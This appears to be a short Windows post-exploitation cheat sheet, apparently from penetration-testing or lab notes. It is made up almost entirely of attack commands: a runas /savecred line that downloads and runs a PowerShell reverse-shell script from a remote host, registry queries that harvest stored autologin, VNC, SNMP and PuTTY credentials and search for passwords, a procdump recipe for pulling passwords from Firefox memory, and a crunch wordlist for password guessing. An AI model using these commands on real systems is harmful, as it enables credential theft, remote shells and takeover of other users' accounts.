```powershell
cmdkey /list # If there some password : runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')"
```

```powershell
reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' # Windows autologin
```

```powershell
reg query 'HKCU\Software\ORL\WinVNC3\Password' # VNC
```

```powershell
reg query 'HKLM\SYSTEM\Current\ControlSet\Services\SNMP' # SNMP Parameters
```

```powershell
reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions' # Putty
```

```powershell
reg query HKLM /f password /t REG_SZ /s # Search for password in registry in HKLM
reg query HKCU /f password /t REG_SZ /s # Search for password in registry in HKCU
```

```powershell
runas /user:$NEW_USER cmd.exe # Use the cleartext creds
```

### Dump firefox for passwords

```powershell
# Looking for Firefox
Get-Process
./procdump64.exe -ma $FIREFOX_PID
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```

Use the potential of new cleartext password found to get an other user:
```shell
crunch 6 6 -t FindedPassword%%% > wordlist
```
